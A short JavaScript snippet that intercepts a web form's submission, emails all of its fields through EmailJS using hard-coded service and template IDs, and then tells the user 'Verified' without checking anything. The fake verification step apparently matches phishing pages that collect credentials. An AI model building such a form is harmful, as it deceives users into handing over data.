
const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Verifying...';

   const serviceID = 'service_w85gxnp';
   const templateID = 'template_0kjwnfw';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Verify';
      alert('Verified');
    }, (err) => {
      btn.value = 'Verify';
      alert(JSON.stringify(err));
    });
});